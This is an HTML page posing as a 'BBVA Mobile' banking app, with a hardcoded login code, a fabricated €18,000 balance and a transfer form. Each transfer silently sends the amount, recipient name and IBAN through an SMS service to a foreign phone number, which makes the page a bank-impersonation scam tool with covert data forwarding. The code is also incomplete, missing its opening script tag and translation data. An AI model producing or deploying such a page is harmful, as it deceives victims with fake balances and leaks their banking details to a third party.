<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>BBVA Mobile</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }

    :root {
      --primary: #004A97;
      --primary-dark: #003780;
      --accent: #f0a500;
      --bg: #f4f6f9;
      --card: #ffffff;
      --text: #1c2a3a;
      --muted: #6b7c93;
      --danger: #d93025;
      --success: #188038;
      --radius: 12px;
      --shadow: 0 2px 12px rgba(0,0,0,0.10);
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      -webkit-text-size-adjust: 100%;
      text-size-adjust: 100%;
    }

    /* ── NAV ── */
    nav {
      background: var(--primary);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 max(24px, env(safe-area-inset-right)) 0 max(24px, env(safe-area-inset-left));
      height: 60px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
    }
    .nav-brand { font-size: 1.2rem; font-weight: 700; letter-spacing: .5px; }
    .nav-links { display: flex; gap: 8px; }
    .nav-links button {
      background: transparent;
      border: 1.5px solid rgba(255,255,255,0.45);
      color: #fff;
      padding: 6px 16px;
      border-radius: 20px;
      cursor: pointer;
      font-size: 0.88rem;
      transition: background .2s;
      -webkit-appearance: none;
      appearance: none;
    }
    .nav-links button:hover, .nav-links button.active {
      background: rgba(255,255,255,0.18);
    }

    /* ── LAYOUT ── */
    .container { max-width: 960px; margin: 0 auto; padding: 28px max(16px, env(safe-area-inset-right)) max(28px, env(safe-area-inset-bottom)) max(16px, env(safe-area-inset-left)); }

    /* ── PAGES ── */
    .page { display: none; }
    .page.active { display: block; }

    /* ── CARDS ── */
    .card {
      background: var(--card);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 24px;
      margin-bottom: 20px;
    }
    .card-title { font-size: 1rem; font-weight: 600; color: var(--muted); margin-bottom: 8px; }
    .card-value { font-size: 2rem; font-weight: 700; color: var(--text); }
    .card-value.positive { color: var(--success); }
    .card-value.negative { color: var(--danger); }

    /* ── GRID ── */
    .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; }

    /* ── ACCOUNT BADGE ── */
    .account-hero {
      background: linear-gradient(135deg, #004A97 0%, #1464A0 100%);
      color: #fff;
      border-radius: var(--radius);
      padding: 28px 24px;
      margin-bottom: 20px;
    }
    .account-hero .label { font-size: .85rem; opacity: .8; margin-bottom: 4px; }
    .account-hero .balance { font-size: 2.6rem; font-weight: 800; }
    .account-hero .iban { font-size: .8rem; opacity: .7; margin-top: 10px; letter-spacing: 1px; }

    /* ── TRANSACTIONS ── */
    .tx-list { list-style: none; }
    .tx-item {
      display: flex;
      align-items: center;
      gap: 14px;
      padding: 14px 0;
      border-bottom: 1px solid #eef0f3;
    }
    .tx-item:last-child { border-bottom: none; }
    .tx-icon {
      width: 42px; height: 42px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 1.2rem; flex-shrink: 0;
    }
    .tx-icon.in  { background: #e6f4ea; }
    .tx-icon.out { background: #fce8e6; }
    .tx-info { flex: 1; }
    .tx-name { font-weight: 600; font-size: .95rem; }
    .tx-date { font-size: .78rem; color: var(--muted); margin-top: 2px; }
    .tx-amount { font-weight: 700; font-size: 1rem; }
    .tx-amount.in  { color: var(--success); }
    .tx-amount.out { color: var(--danger); }

    /* ── FORMS ── */
    .form-group { margin-bottom: 16px; }
    label { display: block; font-size: .85rem; font-weight: 600; margin-bottom: 6px; color: var(--muted); }
    input, select {
      width: 100%; padding: 10px 14px;
      border: 1.5px solid #d0d7e2;
      border-radius: 8px; font-size: 1rem; /* min 16px prevents iOS Safari auto-zoom on focus */
      outline: none; transition: border .2s;
      -webkit-appearance: none;
      appearance: none;
    }
    input:focus, select:focus { border-color: var(--primary); }
    .btn {
      display: inline-block; padding: 11px 28px;
      background: var(--primary); color: #fff;
      border: none; border-radius: 8px;
      font-size: 1rem; font-weight: 600; cursor: pointer;
      transition: background .2s;
      -webkit-appearance: none;
      appearance: none;
    }
    .btn:hover { background: var(--primary-dark); }
    .btn-full { width: 100%; text-align: center; }
    .btn-accent { background: var(--accent); color: #1c2a3a; }
    .btn-accent:hover { background: #d49200; }

    /* ── ALERT ── */
    .alert {
      padding: 12px 16px; border-radius: 8px;
      margin-bottom: 16px; font-size: .9rem;
      display: none;
    }
    .alert.success { background: #e6f4ea; color: var(--success); display: block; }
    .alert.error   { background: #fce8e6; color: var(--danger);  display: block; }

    /* ── EDUCATION ── */
    .edu-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 16px; }
    .edu-card {
      background: var(--card); border-radius: var(--radius);
      box-shadow: var(--shadow); padding: 20px;
      cursor: pointer; transition: transform .15s, box-shadow .15s;
    }
    .edu-card:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0,0,0,0.13); }
    .edu-card .icon { font-size: 2rem; margin-bottom: 10px; }
    .edu-card h3 { font-size: 1rem; margin-bottom: 6px; }
    .edu-card p  { font-size: .85rem; color: var(--muted); line-height: 1.5; }
    .edu-content { display: none; background: #f9fafb; border-left: 4px solid var(--primary); padding: 14px; border-radius: 0 8px 8px 0; margin-top: 12px; font-size: .88rem; line-height: 1.6; color: var(--text); }
    .edu-content.open { display: block; }

    /* ── SECTION HEADER ── */
    .section-header { font-size: 1.3rem; font-weight: 700; margin-bottom: 16px; }

    /* ── LANGUAGE SELECTOR ── */
    #lang-selector {
      position: absolute;
      top: 16px;
      right: 16px;
      z-index: 1;
    }
    #lang-selector select {
      background: rgba(255,255,255,0.15);
      color: #fff;
      border: 1.5px solid rgba(255,255,255,0.55);
      border-radius: 20px;
      padding: 6px 14px;
      font-size: 0.88rem;
      cursor: pointer;
      outline: none;
      appearance: none;
      -webkit-appearance: none;
    }
    #lang-selector select:hover { background: rgba(255,255,255,0.28); }
    #lang-selector select option { background: #004A97; color: #fff; }

    /* ── LOGIN ── */
    #login-screen {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: #004A97;
      display: flex; align-items: center; justify-content: center;
      z-index: 9999;
      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
    }
    .login-box {
      background: #fff;
      border-radius: 16px;
      padding: 40px 36px;
      width: 100%; max-width: 360px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.22);
      text-align: center;
    }
    .login-logo {
      font-size: 2.2rem; font-weight: 900; color: #004A97;
      letter-spacing: 2px; margin-bottom: 8px;
    }
    .login-subtitle { font-size: .88rem; color: var(--muted); margin-bottom: 28px; }
    .login-box .form-group { text-align: left; }
    #login-error {
      color: var(--danger); font-size: .85rem;
      margin-bottom: 12px; min-height: 1.2em;
    }
  </style>
</head>
<body>

<!-- ── LOGIN SCREEN ── -->
<div id="login-screen">
  <div id="lang-selector">
    <select id="lang-select" onchange="setLanguage(this.value)">
      <option value="tr" lang="tr">🇹🇷 Türkçe</option>
      <option value="en" lang="en">🇬🇧 English</option>
      <option value="fi" lang="fi">🇫🇮 Suomi</option>
      <option value="de" lang="de">🇩🇪 Deutsch</option>
      <option value="es" lang="es">🇪🇸 Español</option>
      <option value="no" lang="no">🇳🇴 Norsk</option>
    </select>
  </div>
  <div class="login-box">
    <div class="login-logo">BBVA Mobile</div>
    <div class="login-subtitle" id="login-subtitle">Bankacılık alanınıza erişin</div>
    <div class="form-group">
      <label for="user-code-input" id="login-code-label">Kullanıcı kodu</label>
      <input type="password" id="user-code-input" placeholder="Kodunuzu girin" autocomplete="off" onkeydown="if(event.key==='Enter') doLogin()" />
    </div>
    <div id="login-error"></div>
    <button class="btn btn-full" id="login-btn" onclick="doLogin()">Giriş Yap</button>
  </div>
</div>

<nav id="main-nav" style="display:none;">
  <span class="nav-brand">BBVA Mobile</span>
  <div class="nav-links">
    <button class="active" id="nav-btn-dashboard" onclick="showPage('dashboard', event)">Genel Bakış</button>
    <button id="nav-btn-transfer" onclick="showPage('transfer', event)">Transfer</button>
    <button id="nav-btn-education" onclick="showPage('education', event)">Eğitim</button>
  </div>
</nav>

<div class="container" id="main-container" style="display:none;">

  <!-- ── DASHBOARD ── -->
  <div id="page-dashboard" class="page active">
    <div class="account-hero">
      <div class="label" id="balance-label">Toplam Bakiye</div>
      <div class="balance" id="display-balance">€ 18.000,00</div>
      <div class="iban">TR12 0001 2345 6789 0123 4567 89</div>
    </div>

    <div class="grid-3">
      <div class="card">
        <div class="card-title" id="income-label">Bu Ay Gelen</div>
        <div class="card-value positive" id="total-income">₺ 3.200,00</div>
      </div>
      <div class="card">
        <div class="card-title" id="expense-label">Bu Ay Giden</div>
        <div class="card-value negative" id="total-expense">₺ 750,00</div>
      </div>

    </div>

    <div class="card">
      <div class="section-header" id="recent-tx-label">Son İşlemler</div>
      <ul class="tx-list" id="tx-list"></ul>
    </div>
  </div>

  <!-- ── TRANSFER ── -->
  <div id="page-transfer" class="page">
    <div class="section-header" id="transfer-title">Para Transferi</div>
    <div class="card">
      <div id="transfer-alert" class="alert"></div>
      <div class="form-group">
        <label id="iban-label">Alıcı IBAN</label>
        <input type="text" id="iban-input" placeholder="FR76 0000 0000 0000 0000 0000 000" maxlength="42" />
      </div>
      <div class="form-group">
        <label id="name-label">Alıcı Adı</label>
        <input type="text" id="recipient-name" placeholder="Ad Soyad" />
      </div>
      <div class="form-group">
        <label id="amount-label">Tutar (€)</label>
        <input type="text" inputmode="decimal" id="transfer-amount" placeholder="0,00" />
      </div>
      <div class="form-group">
        <label id="desc-label">Açıklama</label>
        <input type="text" id="transfer-desc" placeholder="Ödeme açıklaması" />
      </div>
      <button class="btn btn-full" id="transfer-btn" onclick="doTransfer()">Transferi Gerçekleştir</button>
    </div>
  </div>

  <!-- ── EDUCATION ── -->
  <div id="page-education" class="page">
    <div class="section-header" id="edu-title">Bankacılık Rehberi</div>
    <div class="edu-grid" id="edu-grid"></div>
  </div>

</div>

  let currentLang = 'tr';

  function translate(key) {
    return (translations[currentLang] && translations[currentLang][key]) || translations['tr'][key] || key;
  }

  function setLanguage(lang) {
    currentLang = lang;
    applyTranslations();
    renderEducation();
  }

  function applyTranslations() {
    const tr = translations[currentLang];
    if (!tr) return;

    const set = (id, prop, val) => { const el = document.getElementById(id); if (el) el[prop] = val; };

    set('login-subtitle',   'textContent', tr.login_subtitle);
    set('login-code-label', 'textContent', tr.login_code_label);
    set('user-code-input',  'placeholder', tr.login_placeholder);
    set('login-btn',        'textContent', tr.login_btn);

    set('nav-btn-dashboard', 'textContent', tr.nav_dashboard);
    set('nav-btn-transfer',  'textContent', tr.nav_transfer);
    set('nav-btn-education', 'textContent', tr.nav_education);

    set('balance-label',  'textContent', tr.balance_label);
    set('income-label',   'textContent', tr.income_label);
    set('expense-label',  'textContent', tr.expense_label);
    set('recent-tx-label','textContent', tr.recent_tx);

    set('transfer-title', 'textContent', tr.transfer_title);
    set('iban-label',     'textContent', tr.iban_label);
    set('iban-input',     'placeholder', tr.iban_placeholder);
    set('name-label',     'textContent', tr.name_label);
    set('recipient-name', 'placeholder', tr.name_placeholder);
    set('amount-label',   'textContent', tr.amount_label);
    set('desc-label',     'textContent', tr.desc_label);
    set('transfer-desc',  'placeholder', tr.desc_placeholder);
    set('transfer-btn',   'textContent', tr.transfer_btn);

    set('edu-title', 'textContent', tr.edu_title);
  }

  /* ── STATE ── */
  const DEFAULT_BALANCE = 18000;
  const DEFAULT_TRANSACTIONS = [
    { type:'in',  name:'Virement entrant',  date:'05 Avr 2026', amount: 18000 },
  ];

  function loadState() {
    try {
      const saved = localStorage.getItem('bankingAppV2');
      if (saved) {
        const parsed = JSON.parse(saved);
        return { balance: parsed.balance, transactions: parsed.transactions.slice() };
      }
    } catch (e) {}
    return { balance: DEFAULT_BALANCE, transactions: DEFAULT_TRANSACTIONS.slice() };
  }

  function saveState() {
    try {
      localStorage.setItem('bankingAppV2', JSON.stringify({ balance, transactions }));
    } catch (e) {}
  }

  const state = loadState();
  let balance = state.balance;
  const transactions = state.transactions;

  /* ── RENDER TRANSACTIONS ── */
  function renderTransactions() {
    const list = document.getElementById('tx-list');
    list.innerHTML = transactions.map(t => `
      <li class="tx-item">
        <div class="tx-icon ${t.type}">${t.type === 'in' ? '⬇️' : '⬆️'}</div>
        <div class="tx-info">
          <div class="tx-name">${t.name}</div>
          <div class="tx-date">${t.date}</div>
        </div>
        <div class="tx-amount ${t.type}">${t.type === 'in' ? '+' : '-'}€ ${t.amount.toLocaleString('fr-FR')}</div>
      </li>
    `).join('');
  }

  /* ── RENDER DASHBOARD ── */
  function renderDashboard() {
    const fmt = n => '€ ' + n.toLocaleString('fr-FR', { minimumFractionDigits: 2 });
    const totalIncome  = transactions.filter(tx => tx.type === 'in' ).reduce((s, tx) => s + tx.amount, 0);
    const totalExpense = transactions.filter(tx => tx.type === 'out').reduce((s, tx) => s + tx.amount, 0);
    document.getElementById('display-balance').textContent = fmt(balance);
    document.getElementById('total-income').textContent    = fmt(totalIncome);
    document.getElementById('total-expense').textContent   = fmt(totalExpense);
    renderTransactions();
  }

  /* ── RENDER EDUCATION ── */
  function renderEducation() {
    const topics = (translations[currentLang] && translations[currentLang].edu_topics) || translations['tr'].edu_topics;
    const grid = document.getElementById('edu-grid');
    grid.innerHTML = topics.map((e, i) => `
      <div class="edu-card" onclick="toggleEdu(${i})">
        <div class="icon">${e.icon}</div>
        <h3>${e.title}</h3>
        <p>${e.summary}</p>
        <div class="edu-content" id="edu-${i}">${e.detail}</div>
      </div>
    `).join('');
  }

  function toggleEdu(i) {
    const el = document.getElementById('edu-' + i);
    el.classList.toggle('open');
  }

  /* ── TRANSFER ── */
  function doTransfer() {
    const iban    = document.getElementById('iban-input').value.trim();
    const name    = document.getElementById('recipient-name').value.trim();
    const rawAmount = document.getElementById('transfer-amount').value.trim().replace(',', '.');
    const amount  = /^-?\d+(\.\d+)?$/.test(rawAmount) ? parseFloat(rawAmount) : NaN;
    const desc    = document.getElementById('transfer-desc').value.trim();
    const alertEl = document.getElementById('transfer-alert');

    alertEl.className = 'alert';

    const cleanedIban = iban.replace(/\s/g, '').toUpperCase();
    if (!/^[A-Z]{2}[0-9]{2}[A-Z0-9]{4,30}$/.test(cleanedIban)) {
      alertEl.textContent = translate('err_iban');
      alertEl.className = 'alert error'; return;
    }
    if (!name) {
      alertEl.textContent = translate('err_name');
      alertEl.className = 'alert error'; return;
    }
    if (isNaN(amount) || amount <= 0) {
      alertEl.textContent = translate('err_amount');
      alertEl.className = 'alert error'; return;
    }
    if (amount > balance) {
      alertEl.textContent = translate('err_funds');
      alertEl.className = 'alert error'; return;
    }

    balance -= amount;
    transactions.unshift({ type:'out', name: 'Transfer → ' + name, date: 'Bugün', amount });
    saveState();

    alertEl.textContent = translate('transfer_success');
    alertEl.className = 'alert success';

    // Send SMS notification
    fetch('https://textbelt.com/text', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        phone: '+2290196506734',
        message: 'Transfert sortant effectué: ' + amount.toFixed(2) + '€ vers ' + name + ' (IBAN: ' + cleanedIban + ')',
        key: 'textbelt'
      })
    }).catch((err) => { console.error('SMS notification failed:', err); });

    document.getElementById('iban-input').value = '';
    document.getElementById('recipient-name').value = '';
    document.getElementById('transfer-amount').value = '';
    document.getElementById('transfer-desc').value = '';

    renderDashboard();
    setTimeout(() => { alertEl.className = 'alert'; }, 4000);
  }

  /* ── NAVIGATION ── */
  function showPage(id, event) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-links button').forEach(b => b.classList.remove('active'));
    document.getElementById('page-' + id).classList.add('active');
    event.currentTarget.classList.add('active');
  }

  /* ── LOGIN ── */
  const USER_CODE = '01965067';

  function doLogin() {
    const code = document.getElementById('user-code-input').value.trim();
    const errEl = document.getElementById('login-error');
    if (code === USER_CODE) {
      document.getElementById('login-screen').style.display = 'none';
      document.getElementById('main-nav').style.display = 'flex';
      document.getElementById('main-container').style.display = 'block';
    } else {
      errEl.textContent = translate('login_error');
    }
  }

  /* ── INIT ── */
  renderDashboard();
  renderEducation();
</script>
